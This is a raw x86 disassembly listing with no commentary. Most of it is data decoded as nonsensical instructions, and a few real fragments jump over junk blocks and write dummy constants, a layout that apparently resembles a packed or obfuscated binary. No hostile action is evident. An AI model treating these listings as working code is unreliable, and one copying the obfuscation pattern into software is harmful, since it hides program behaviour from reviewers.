  406147:	test   DWORD PTR [ebp*1+0x6c96f157],ebp
  40614e:	jo     0x4060f9
  406150:	outs   dx,DWORD PTR ds:[esi]
  406151:	mov    WORD PTR [edi+0x70208114],ss
  406157:	nop
  406158:	lds    esp,FWORD PTR [esi-0x2cf10070]
  40615e:	int3   
  40615f:	ins    BYTE PTR es:[edi],dx
  406160:	pushf  
  406161:	outs   dx,DWORD PTR ds:[esi]
  406162:	inc    ecx
  406163:	mov    ebx,0x9dae362e
  406168:	dec    ebp
  406169:	add    al,0x6f
  40616b:	pop    eax
  40616c:	enter  0xf499,0x4a
  406170:	mov    bh,0xf6
  406172:	dec    edi
  406173:	add    eax,0xa9ab6b7b
  406178:	push   edx
  406179:	nop
  40617a:	dec    ebp
  40617b:	ret    
  40617c:	sub    ch,BYTE PTR [edi+eax*8]
  40617f:	xor    DWORD PTR [ebx+0x6b],ebx
  406182:	test   eax,0x1bb330a7
  406187:	mov    ecx,0x1e242bc2
  40618c:	(bad)  [edi+0x5b]
  40618f:	add    esp,DWORD PTR [eax-0x78a9f170]
  406195:	fdiv   DWORD PTR [esi-0xe]
  406198:	sub    eax,ecx
  40619a:	into   
  40619b:	sub    DWORD PTR [edi-0x12],ecx
  40619e:	fdivr  DWORD PTR [esi]
  4061a0:	or     cl,BYTE PTR gs:[ebx]
  4061a3:	fwait
  4061a4:	popa   
  4061a5:	test   al,0x2d
  4061a7:	jle    0x406188
  4061a9:	jmp    DWORD PTR ds:0x454cbb9a
  4061af:	fisttp DWORD PTR [edi+eiz*4]
  4061b2:	pop    edi
  4061b3:	arpl   WORD PTR [ebx-0x69],cx
  4061b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061b7:	rdpmc  
  4061b9:	mov    al,ds:0x8a1be662
  4061be:	mov    esi,0xf2fbc8ac
  4061c3:	sub    al,0xeb
  4061c5:	mov    cl,0x6b
  4061c7:	in     eax,dx
  4061c8:	pop    ds
  4061c9:	push   cs
  4061ca:	imul   esp,ebp,0x134a067c
  4061d0:	dec    eax
  4061d1:	dec    eax
  4061d2:	push   ebx
  4061d3:	test   eax,0x87c4aa68
  4061d8:	ret    0x202e
  4061db:	jo     0x406234
  4061dd:	shl    BYTE PTR [edi],cl
  4061df:	sbb    al,0x49
  4061e1:	or     dl,cl
  4061e3:	scas   al,BYTE PTR es:[edi]
  4061e4:	pop    esi
  4061e5:	push   ds
  4061e6:	and    BYTE PTR [esp+ebp*8-0xdfc6d64],al
  4061ed:	aam    0x38
  4061ef:	adc    al,BYTE PTR ds:0xc2e7eb2f
  4061f5:	aam    0x7a
  4061f7:	es jmp 0x406268
  4061fa:	scas   al,BYTE PTR es:[edi]
  4061fb:	mov    al,0xcd
  4061fd:	mov    edi,0x622c93d
  406202:	inc    ebp
  406203:	pop    edx
  406204:	mov    dh,0xcc
  406206:	daa    
  406207:	mov    ds:0xc71b5b6c,eax
  40620c:	xor    BYTE PTR [edi-0x22],0xb
  406210:	lods   al,BYTE PTR ds:[esi]
  406211:	cld    
  406212:	push   es
  406213:	loop   0x40628e
  406215:	and    ah,bh
  406217:	jmp    0xcb22eb7c
  40621c:	test   eax,0x955a6b92
  406221:	jmp    0xc1c9:0x755fc427
  406228:	sub    al,bl
  40622a:	nop
  40622b:	in     eax,0x6b
  40622d:	mov    dh,0x19
  40622f:	out    0xa7,al
  406231:	into   
  406232:	push   edi
  406233:	push   esp
  406234:	(bad)  
  406235:	mov    esp,0x299facb0
  40623a:	arpl   WORD PTR [ebp+0x7d3b472d],bx
  406240:	pop    ecx
  406241:	mov    ch,0x70
  406243:	sbb    BYTE PTR [ebx+0xff91ab8],0x18
  40624a:	pushf  
  40624b:	or     eax,0x61ffab5b
  406250:	jnp    0x40621d
  406252:	sub    bl,dl
  406254:	pop    esi
  406255:	mov    cl,0xd2
  406257:	in     eax,dx
  406258:	jo     0x4061ec
  40625a:	adc    DWORD PTR [esp+ebp*1+0x43],ebp
  40625e:	out    dx,eax
  40625f:	inc    eax
  406260:	sub    BYTE PTR [eax-0x14],dl
  406263:	js     0x4062da
  406265:	(bad)  
  406266:	fnsave [ebx-0x5]
  406269:	pop    ds
  40626a:	hlt    
  40626b:	mov    bl,0xab
  40626d:	hlt    
  40626e:	push   ebx
  40626f:	pop    esi
  406270:	(bad)  
  406271:	sub    al,0x19
  406273:	xchg   ebx,eax
  406274:	add    edi,DWORD PTR [eax+0x59]
  406277:	retf   
  406278:	cdq    
  406279:	or     al,BYTE PTR [esi]
  40627b:	jbe    0x406211
  40627d:	stc    
  40627e:	push   edx
  40627f:	mov    ebp,0x957d4341
  406284:	lods   al,BYTE PTR ds:[esi]
  406285:	pop    eax
  406286:	pop    ds
  406287:	push   ecx
  406288:	das    
  406289:	imul   eax,edi,0x62
  40628c:	and    BYTE PTR [esi],dh
  40628e:	repnz ins BYTE PTR es:[edi],dx
  406290:	stos   WORD PTR es:[edi],ax
  406292:	in     al,0x9a
  406294:	ret    
  406295:	dec    esp
  406296:	and    ah,al
  406298:	mov    esi,0x33f8758b
  40629d:	ret    0xf233
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43359f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	and    ecx,DWORD PTR [esi+0x3b348e1c]
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x4062aa
  4062f9:	jg     0x4062cd
  4062fb:	jns    0x406327
  4062fd:	xchg   BYTE PTR [ecx-0x53],cl
  406300:	sbb    al,0xc9
  406302:	mov    al,0xbb
  406304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406305:	jae    0x406301
  406307:	hlt    
  406308:	cdq    
  406309:	mov    al,ds:0x5a75591
  40630e:	icebp  
  40630f:	cs mov esp,0xfa961a1
  406315:	dec    ebp
  406316:	push   esp
  406317:	sbb    DWORD PTR [ebx-0x460993a3],ebp
  40631d:	imul   edx,DWORD PTR [edi-0x75],0x39c4f680
  406324:	iret   
  406325:	mov    dl,0xa
  406327:	jge    0x4062c6
  406329:	bound  ebx,QWORD PTR [eax-0x1c2bdc68]
  40632f:	popa   
  406330:	xchg   edi,eax
  406331:	rcr    ch,1
  406333:	mov    ecx,0x6fc0d0e8
  406338:	pop    eax
  406339:	ss xor al,0xbe
  40633c:	cs iret 
  40633e:	into   
  40633f:	add    eax,0x84cad79a
  406344:	fiadd  DWORD PTR [esi+0x19831d57]
  40634a:	test   DWORD PTR [ecx+0x283c38b],ebx
  406350:	cld    
  406351:	fild   WORD PTR [edi]
  406353:	sub    al,0x6
  406355:	loope  0x4063d1
  406357:	adc    ebp,edi
  406359:	jae    0x406331
  40635b:	stos   BYTE PTR es:[edi],al
  40635c:	jne    0x4062ec
  40635e:	dec    eax
  40635f:	test   BYTE PTR es:[ebx],dh
  406362:	pop    eax
  406363:	mov    eax,ds:0xa1c1470
  406368:	loope  0x4063aa
  40636a:	inc    ebx
  40636b:	push   edi
  40636c:	out    dx,eax
  40636d:	sub    ah,ah
  40636f:	push   ss
  406370:	aaa    
  406371:	jmp    0x4063a9
  406373:	cmp    BYTE PTR [ebx-0xb],bh
  406376:	mov    al,ds:0x86d8c432
  40637b:	push   esi
  40637c:	mov    DWORD PTR ds:0xd8669eb1,esp
  406382:	std    
  406383:	leave  
  406384:	xchg   DWORD PTR [ebx],esi
  406386:	in     eax,0x5c
  406388:	loopne 0x4063f8
  40638a:	and    edx,DWORD PTR [eax+0x40e2d0c1]
  406390:	fnstenv [edx]
  406392:	pop    ecx
  406393:	loop   0x4063ea
  406395:	cmp    BYTE PTR [esi+0x508a2d79],cl
  40639b:	add    BYTE PTR [eax-0xa9f5ac2],dh
  4063a1:	add    BYTE PTR [eax+0x1c],0x49
  4063a5:	xchg   esi,eax
  4063a6:	in     eax,0x8b
  4063a8:	js     0x406332
  4063aa:	sub    edi,eax
  4063ac:	and    al,0x6e
  4063ae:	xchg   esp,eax
  4063af:	into   
  4063b0:	lea    ebx,[ebx-0x35b3e2aa]
  4063b6:	jp     0x406343
  4063b8:	jge    0x406370
  4063ba:	xchg   edi,ebx
  4063bc:	inc    ecx
  4063bd:	fiadd  DWORD PTR [ebp+0x6f]
  4063c0:	retf   
  4063c1:	add    eax,0x51f68a59
  4063c6:	in     eax,0xb2
  4063c8:	hlt    
  4063c9:	fwait
  4063ca:	imul   ebp,DWORD PTR [edx],0xc2db4878
  4063d0:	ss dec ebp
  4063d2:	mov    ecx,DWORD PTR [edi]
  4063d4:	sti    
  4063d5:	jb     0x40640f
  4063d7:	add    al,0x11
  4063d9:	inc    edi
  4063da:	mov    esi,0x183fae85
  4063df:	int3   
  4063e0:	sub    bh,bl
  4063e2:	xchg   edi,eax
  4063e3:	in     al,0x16
  4063e5:	sub    DWORD PTR [ebx-0x54b117d4],edx
  4063eb:	cmp    DWORD PTR [ebp-0x4c],eax
  4063ee:	pop    esi
  4063ef:	cmp    BYTE PTR [eax+0x67],dh
  4063f2:	cwde   
  4063f3:	pop    eax
  4063f4:	push   es
  4063f5:	lock jp 0x406452
  4063f8:	ins    DWORD PTR es:[edi],dx
  4063f9:	cmp    BYTE PTR [esi-0x3a62cb02],cl
  4063ff:	dec    ecx
  406400:	adc    BYTE PTR [edx],dl
  406402:	fs pushf 
  406404:	loopne 0x406481
  406406:	outs   dx,BYTE PTR ds:[esi]
  406407:	cmp    ecx,DWORD PTR [ecx+ecx*2-0x6e]
  40640b:	and    DWORD PTR [edx-0x70d5924],ecx
  406411:	adc    eax,0xb090e007
  406416:	xstore-rng (bad)
  406417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406418:	sbb    ch,0x32
  40641b:	inc    ecx
  40641c:	sbb    esp,ecx
  40641e:	leave  
  40641f:	xor    al,0xe
  406421:	fs jae 0x4063d0
  406424:	xchg   esi,eax
  406425:	sbb    ebx,DWORD PTR [ebp-0x9]
  406428:	aaa    
  406429:	loop   0x4063e7
  40642b:	jecxz  0x4063e0
  40642d:	mov    BYTE PTR [esi+0x3381bea],bl
  406433:	cld    
  406434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406435:	mov    esp,0x17845965
  40643a:	es (bad) 
  40643c:	or     al,0x65
  40643e:	ins    DWORD PTR es:[edi],dx
  40643f:	pop    ss
  406440:	add    al,0xae
  406442:	dec    eax
  406443:	jecxz  0x40649c
  406445:	xchg   ebp,eax
  406446:	and    DWORD PTR ds:0xf4b32561,esp
  40644c:	add    BYTE PTR [esi-0x5e],ch
  40644f:	mov    ds:0xe1eb5ee8,al
  406454:	rol    DWORD PTR [edx],cl
  406456:	xchg   BYTE PTR [eax],cl
  406458:	sub    esp,edi
  40645a:	jne    0x406497
  40645c:	in     eax,0xbe
  40645e:	aam    0x12
  406460:	aas    
  406461:	ds out dx,eax
  406463:	ror    BYTE PTR [eax],cl
  406465:	arpl   WORD PTR [ecx+0x57df2d96],di
  40646b:	loop   0x40640f
  40646d:	clc    
  40646e:	xlat   BYTE PTR ds:[ebx]
  40646f:	ret    
  406470:	retf   
  406471:	in     al,0x5f
  406473:	sahf   
  406474:	out    dx,eax
  406475:	dec    eax
  406476:	and    eax,0xb3855ac9
  40647b:	xchg   DWORD PTR [ecx],esp
  40647d:	enter  0x21ac,0xea
  406481:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  406483:	mov    bh,dl
  406485:	int3   
  406486:	rcr    BYTE PTR [esi+0xc],cl
  406489:	ins    DWORD PTR es:[edi],dx
  40648a:	cld    
  40648b:	(bad)  
  40648c:	cmp    eax,0xb3ed3505
  406491:	xchg   ebx,eax
  406492:	je     0x406490
  406494:	push   edx
  406495:	test   al,0xb9
  406497:	dec    ebp
  406498:	das    
  406499:	adc    eax,0x671dd2c7
  40649e:	mov    ebx,0xa2da40b3
  4064a3:	xor    DWORD PTR [ecx+0x31f1ebcc],edx
  4064a9:	adc    esi,ecx
  4064ab:	aad    0x16
  4064ad:	bound  ebp,QWORD PTR [edi-0x46810992]
  4064b3:	iret   
  4064b4:	push   ebp
  4064b5:	(bad)  
  4064b6:	imul   ebp,DWORD PTR [ecx],0xffffffb0
  4064b9:	(bad)  
  4064ba:	mov    al,ds:0x7c30e7b1
  4064bf:	clc    
  4064c0:	xchg   esp,eax
  4064c1:	mov    al,0x56
  4064c3:	xor    al,0x44
  4064c5:	mov    esi,ss
  4064c7:	int    0xae
  4064c9:	in     al,dx
  4064ca:	mov    ah,0x76
  4064cc:	sub    DWORD PTR [esi],0xb
  4064cf:	push   ds
  4064d0:	xor    ah,dh
  4064d2:	in     eax,dx
  4064d3:	rol    dl,1
  4064d5:	icebp  
  4064d6:	aam    0xd7
  4064d8:	and    DWORD PTR [edx+esi*2],esi
  4064db:	dec    ebp
  4064dc:	jle    0x40653c
  4064de:	sbb    edi,edi
  4064e0:	lahf   
  4064e1:	sti    
  4064e2:	cld    
  4064e3:	rcl    BYTE PTR [edi-0xddbc53d],1
  4064e9:	out    0x8b,eax
  4064eb:	(bad)  
  4064ec:	pop    ebx
  4064ed:	sbb    eax,0x310cf2ad
  4064f2:	leave  
  4064f3:	fidivr WORD PTR [ebx-0xa]
  4064f6:	sub    esp,edi
  4064f8:	les    esp,FWORD PTR [ecx+0x47]
  4064fb:	jbe    0x4064e7
  4064fd:	jp     0x4064f9
  4064ff:	xchg   edi,eax
  406500:	dec    esp
  406501:	mov    bh,0x5b
  406503:	xchg   BYTE PTR [edi-0x4f414e99],dl
  406509:	cmc    
  40650a:	pusha  
  40650b:	ins    BYTE PTR es:[edi],dx
  40650c:	leave  
  40650d:	inc    ebp
  40650e:	imul   ecx,DWORD PTR [ecx],0xd11b4d2c
  406514:	or     ebp,eax
  406516:	sub    ch,BYTE PTR [ecx-0xf0efb70]
  40651c:	mov    cl,0xcf
  40651e:	pop    esp
  40651f:	retf   
  406520:	fmul   DWORD PTR ds:0xd5db69a3
  406526:	fnstenv [eax+0x7787fda6]
  40652c:	jmp    0xbf9b:0x557e969e
  406533:	inc    ebp
  406534:	push   ecx
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4335a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43365f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43355b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4335df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4335df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4335df,ecx
  40658d:	cmp    DWORD PTR ds:0x4335df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4335df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4335df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4335df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4335df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0x495211a
  4065de:	nop
  4065df:	popa   
  4065e0:	sub    al,0xc5
  4065e3:	jl     0x406661
  4065e5:	xor    BYTE PTR [esi+0x7c],bh
  4065e8:	jl     0x406614
  4065ea:	pop    es
  4065eb:	jmp    0x40662f
  4065ed:	icebp  
  4065ee:	inc    eax
  4065ef:	mov    ch,0x48
  4065f1:	daa    
  4065f2:	jg     0x406614
  4065f4:	cmp    BYTE PTR [edi+0x1a96b8c4],cl
  4065fa:	sahf   
  4065fb:	xchg   esi,eax
  4065fc:	call   0x544:0x3e3d47b7
  406603:	mov    edi,DWORD PTR [edi]
  406605:	fisttp DWORD PTR [edi+0x517d3b85]
  40660b:	xchg   ebx,eax
  40660c:	dec    esp
  40660d:	inc    ebp
  40660e:	test   BYTE PTR [esi-0x50],bh
  406611:	adc    BYTE PTR [edi+0x33],bl
  406614:	xrelease mov DWORD PTR [eax+0x594620eb],ebp
  40661b:	jmp    0x351a93
  406620:	push   esi
  406621:	unpckhps xmm2,XMMWORD PTR [edi+0x6bc61312]
  406628:	jmp    0xb67:0xc7410495
  40662f:	es or  DWORD PTR fs:[ebp-0x3],ecx
  406634:	push   0xffffffc6
  406636:	ja     0x406670
  406638:	jns    0x4065d4
  40663a:	test   DWORD PTR [ecx-0x485443a7],0xc1fb8542
  406644:	or     BYTE PTR [esi+0x2a27d6b0],ah
  40664a:	adc    BYTE PTR [edx+edi*4],dh
  40664d:	(bad)  
  40664e:	(bad)  
  40664f:	call   0x813bc8b6
  406654:	fldenv [edx-0x5b]
  406657:	dec    esp
  406658:	nop
  406659:	loop   0x406645
  40665b:	sub    BYTE PTR [eax+0x7e8d9b2f],0x3e
  406662:	outs   dx,BYTE PTR ds:[esi]
  406663:	inc    ebp
  406664:	scas   al,BYTE PTR es:[edi]
  406665:	jecxz  0x4066df
  406667:	push   DWORD PTR [esi-0x290d00ca]
  40666d:	xor    eax,DWORD PTR [ebx]
  40666f:	sub    BYTE PTR [eax+0x71289758],0xed
  406676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406677:	sbb    ch,0x34
  40667a:	add    eax,0x9382d34
  40667f:	adc    BYTE PTR [edx],dh
  406681:	push   ds
  406682:	and    DWORD PTR [edx+0x5fb202de],ebx
  406688:	hlt    
  406689:	xor    eax,0x6ba29199
  40668e:	pop    edx
  40668f:	shr    BYTE PTR [eax+0x21],0x39
  406693:	ret    0x1e61
  406696:	repnz (bad) [ebp-0x36]
  40669a:	aaa    
  40669b:	mov    cl,0x3b
  40669d:	mov    dl,0x25
  40669f:	jo     0x4066e4
  4066a1:	int    0x43
  4066a3:	dec    edx
  4066a4:	fs sbb ebx,esp
  4066a7:	sbb    BYTE PTR [edx-0x13],dl
  4066aa:	push   0x3c934a95
  4066af:	xor    al,0x87
  4066b1:	mov    eax,ds:0x8b26c63f
  4066b6:	in     al,dx
  4066b7:	outs   dx,BYTE PTR ds:[esi]
  4066b8:	in     al,dx
  4066b9:	stos   DWORD PTR es:[edi],eax
  4066ba:	sub    eax,0x2ba0c40f
  4066bf:	cmp    eax,0xe61d0f0d
  4066c4:	mov    BYTE PTR [edi+eax*4-0x2d4254a5],0x55
  4066cc:	add    DWORD PTR [esi],esi
  4066ce:	cld    
  4066cf:	jae    0x406707
  4066d1:	mov    al,ds:0xe2172d1a
  4066d6:	sbb    ebp,DWORD PTR [eax+0x2c1fd9d6]
  4066dc:	xchg   esp,eax
  4066dd:	gs jecxz 0x4066d4
  4066e0:	inc    esp
  4066e1:	int3   
  4066e2:	dec    ebp
  4066e3:	mov    edi,DWORD PTR [edx-0x61]
  4066e6:	stos   DWORD PTR es:[edi],eax
  4066e7:	push   ebp
  4066e8:	push   0x14
  4066ea:	in     eax,dx
  4066eb:	mov    cl,0x76
  4066ed:	mov    ds:0xb2142503,al
  4066f2:	sub    ah,bh
  4066f4:	lea    eax,[ecx-0x65]
  4066f7:	cli    
  4066f8:	loope  0x40675f
  4066fa:	test   al,0xd
  4066fc:	xchg   edx,eax
  4066fd:	add    DWORD PTR [edx],eax
  4066ff:	pop    esp
  406700:	jno    0x4066b4
  406702:	xchg   ebx,eax
  406703:	push   0x4e
  406705:	mov    esi,0x17f95f2e
  40670a:	(bad)  
  40670c:	icebp  
  40670d:	int    0x35
  40670f:	adc    dh,BYTE PTR [ecx+0x57]
  406712:	sub    BYTE PTR [edx],0x97
  406715:	push   ss
  406716:	mov    ch,0x23
  406718:	out    0xef,eax
  40671a:	arpl   dx,ax
  40671c:	cmp    al,0xc3
  40671e:	fsub   DWORD PTR [ecx+edi*4-0x4a22a268]
  406725:	jnp    0x4066ef
  406727:	into   
  406728:	or     eax,DWORD PTR [esi-0x431105db]
  40672e:	pop    ds
  40672f:	in     eax,dx
  406730:	mov    eax,0xf701cb9a
  406735:	cmp    eax,0x835a2f8
  40673a:	cwde   
  40673b:	jmp    0x11151fb0
  406740:	mov    edx,0x2ee975f2
  406745:	(bad)  
  406746:	sahf   
  406747:	pusha  
  406748:	dec    esp
  406749:	retf   
  40674a:	adc    dl,cl
  40674c:	mov    bh,0xd3
  40674e:	int    0xf8
  406750:	cmc    
  406751:	(bad)  
  406752:	mov    ebp,0xd70b3f73
  406757:	mov    ah,0xdb
  406759:	stos   DWORD PTR es:[edi],eax
  40675a:	pop    ds
  40675b:	(bad)  
  40675d:	mov    al,ds:0x1d3daa15
  406762:	inc    edx
  406763:	bound  ebp,QWORD PTR [esi]
  406765:	loop   0x406787
  406767:	add    eax,0xf0ef3f6d
  40676c:	pop    esi
  40676d:	fiadd  DWORD PTR [ecx-0x954c5d5]
  406773:	call   0xd8c83414
  406778:	dec    ebx
  406779:	inc    esp
  40677a:	mov    esi,0xafc0f959
  40677f:	jle    0x4067fe
  406781:	loopne 0x406802
  406783:	test   al,0x1a
  406786:	bound  edi,QWORD PTR [esi]
  406788:	pop    ds
  406789:	dec    eax
  40678a:	sar    DWORD PTR [edi],1
  40678c:	adc    dl,BYTE PTR [ebx]
  40678e:	mov    dh,0x4
  406790:	ds or  al,0x8f
  406793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406794:	test   al,0x38
  406796:	xor    eax,ebx
  406798:	push   esi
  406799:	mov    ecx,0xab1efeaa
  40679e:	out    0x77,al
  4067a0:	es cmp al,0xc9
  4067a3:	push   0x23
  4067a5:	call   0xebe7f71d
  4067aa:	call   0xd92d9e0e
  4067af:	mov    ah,dh
  4067b1:	out    dx,al
  4067b2:	repnz hlt 
  4067b4:	add    dl,BYTE PTR [ebp+0x75]
  4067b7:	loope  0x4067d4
  4067b9:	jmp    0x6d45:0x29ff5560
  4067c0:	std    
  4067c1:	dec    eax
  4067c2:	mov    WORD PTR [ecx+0x18ca0af9],?
  4067c8:	retf   
  4067c9:	inc    ebx
  4067ca:	frstor [edx]
  4067cc:	(bad)  
  4067ce:	call   0xa496:0x48dd3808
  4067d5:	fsubp  st(3),st
  4067d7:	xor    esp,DWORD PTR [ebp+edx*4+0x5ec73db8]
  4067de:	xchg   edx,eax
  4067df:	rcr    edx,1
  4067e1:	cwde   
  4067e2:	jno    0x4067ae
  4067e4:	das    
  4067e5:	rcl    DWORD PTR [ebx-0x14b4d6c3],0x13
  4067ec:	sub    ecx,DWORD PTR [edi-0x57dde31c]
  4067f2:	rcl    esp,0xe
  4067f5:	sub    eax,0x6b2b48f8
  4067fa:	mov    esp,ebp
  4067fc:	mov    DWORD PTR [eax+eax*2],ecx
  4067ff:	outs   dx,BYTE PTR ds:[esi]
  406800:	test   al,0x1d
  406802:	jns    0x40683a
  406804:	jb     0x4067ca
  406806:	leave  
  406807:	xchg   BYTE PTR [ecx+0x7c8405d8],dh
  40680d:	repz retf 0x31c0
  406811:	add    BYTE PTR [edx-0x59b779bb],0xcd
  406818:	imul   ecx,DWORD PTR [ebx],0xbdefeabd
  40681e:	pop    ebx
  40681f:	or     BYTE PTR [ebx-0x8],0xfe
  406823:	xchg   ebp,eax
  406824:	push   ds
  406825:	mov    ecx,0x8a3a
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xc30d6ecb
  40683e:	xchg   BYTE PTR [edi+eax*8+0x7e307c7c],ch
  406845:	jl     0x4068c3
  406847:	enter  0x8e63,0x6f
  40684b:	sahf   
  40684c:	div    al
  40684e:	loopne 0x4068b7
  406850:	push   ebp
  406851:	ret    0x3e2b
  406854:	dec    eax
  406855:	mov    dh,0xb9
  406857:	push   edi
  406858:	das    
  406859:	rol    BYTE PTR [eax-0x64],1
  40685c:	mov    ch,0x1
  40685e:	jo     0x4068b8
  406860:	adc    dl,BYTE PTR [esi-0x1085f842]
  406866:	mov    edi,0xc0a9c4ae
  40686b:	rol    DWORD PTR [ebx],cl
  40686d:	hlt    
  40686e:	push   es
  40686f:	mov    esi,0x9b0ff288
  406874:	enter  0x99ad,0x3d
  406878:	inc    edx
  406879:	(bad)  
  40687a:	cmp    esp,DWORD PTR [ecx+0x5e574af4]
  406880:	mov    DWORD PTR [ebx+0x67],edx
  406883:	mov    ebx,0xca5c890f
  406888:	and    BYTE PTR [ecx-0x17],dh
  40688b:	ja     0x406868
  40688d:	fs jo  0x406815
  406890:	stc    
  406891:	cli    
  406892:	ins    DWORD PTR es:[edi],dx
  406893:	mov    dh,0xcf
  406895:	lock dec esp
  406897:	inc    ebp
  406898:	(bad)  
  406899:	xchg   ebx,eax
  40689a:	xor    al,0x95
  40689c:	neg    BYTE PTR [edi+edx*1+0x22deb4fd]
  4068a3:	cdq    
  4068a4:	jge    0x4068f6
  4068a6:	imul   ebx,DWORD PTR [esi],0x1127f96e
  4068ac:	or     al,0xa3
  4068ae:	and    al,0x8e
  4068b0:	jmp    0x3434:0x65e11ba
  4068b7:	enter  0x242a,0x11
  4068bb:	ins    BYTE PTR es:[edi],dx
  4068bc:	dec    eax
  4068bd:	jp     0x406845
  4068bf:	call   0x1e44e935
  4068c4:	xchg   edx,eax
  4068c5:	ror    dl,1
  4068c7:	jns    0x4068ff
  4068c9:	or     al,0xb
  4068cb:	fst    QWORD PTR [ebp+edx*2+0x26]
  4068cf:	xor    cl,al
  4068d1:	les    ebx,FWORD PTR [ecx-0x4104d8c5]
  4068d7:	repnz xor ebp,edx
  4068da:	loope  0x406956
  4068dc:	aas    
  4068dd:	xor    eax,0x30c0b072
  4068e2:	loope  0x40690b
  4068e4:	push   0x4b
  4068e6:	jmp    0x4f6e1073
  4068eb:	jle    0x406966
  4068ed:	sbb    DWORD PTR [ebp-0x36],esp
  4068f0:	stos   BYTE PTR es:[edi],al
  4068f1:	jb     0x406878
  4068f3:	lods   eax,DWORD PTR ds:[esi]
  4068f4:	cmp    bl,al
  4068f6:	mov    eax,ds:0x75e0b67e
  4068fb:	int    0x18
  4068fd:	aas    
  4068fe:	cmp    BYTE PTR [ebp-0x749681e0],ch
  406904:	jns    0x406910
  406906:	inc    ebx
  406907:	mov    DWORD PTR [ebx+0x7c],ecx
  40690a:	jl     0x4068d1
  40690c:	imul   ebp,DWORD PTR [edi+esi*2+0x33067385],0x67
  406914:	enter  0x1324,0x45
  406918:	cld    
  406919:	stc    
  40691a:	xor    DWORD PTR [edx+0x1a0f5292],ebx
  406920:	dec    esp
  406921:	aas    
  406922:	sbb    eax,ebx
  406924:	fiadd  WORD PTR [eax]
  406926:	jae    0xce7fe08b
  40692c:	retf   0x8255
  40692f:	pop    ebx
  406930:	xchg   esi,eax
  406931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406932:	into   
  406933:	sbb    ecx,DWORD PTR [eax+0x1f7bd739]
  406939:	jmp    0x2992:0xbd8d417
  406940:	call   0x9ebc:0x861d3df
  406947:	xchg   dl,ah
  406949:	std    
  40694a:	cli    
  40694b:	es pop ebp
  40694d:	mov    DWORD PTR [eax+0xb],esi
  406950:	add    BYTE PTR [ecx],bh
  406952:	adc    al,0xc1
  406954:	sub    al,0x5e
  406956:	sub    DWORD PTR [ebx-0x3aadc5ad],esp
  40695c:	or     dh,0x30
  40695f:	lods   eax,DWORD PTR ds:[esi]
  406960:	pop    esi
  406961:	lock add al,0x82
  406964:	dec    ebx
  406965:	cdq    
  406966:	stos   DWORD PTR es:[edi],eax
  406967:	in     al,dx
  406968:	fdivr  QWORD PTR [esi*8+0x2211df61]
  40696f:	jns    0x406951
  406971:	push   ds
  406972:	jmp    0x40694e
  406974:	xchg   ebp,eax
  406975:	pop    es
  406976:	mov    ds:0x42b9a698,eax
  40697b:	call   0x2ff1:0xadd23f7a
  406982:	jns    0x406923
  406984:	dec    ebp
  406985:	stc    
  406986:	fld    TBYTE PTR [edx+0x6f67d15d]
  40698c:	adc    al,0x58
  40698e:	add    BYTE PTR [edx-0x2e],bl
  406991:	(bad)  
  406992:	mov    ah,0xea
  406994:	sbb    BYTE PTR ss:[ebx],bh
  406997:	popf   
  406998:	fs sbb bl,BYTE PTR es:[eax]
  40699c:	bound  esi,QWORD PTR [ecx-0x7c69d188]
  4069a2:	dec    eax
  4069a3:	hlt    
  4069a4:	adc    eax,0xcbe4a359
  4069a9:	in     al,dx
  4069aa:	cli    
  4069ab:	xchg   esi,eax
  4069ac:	sbb    eax,0x5e01ce05
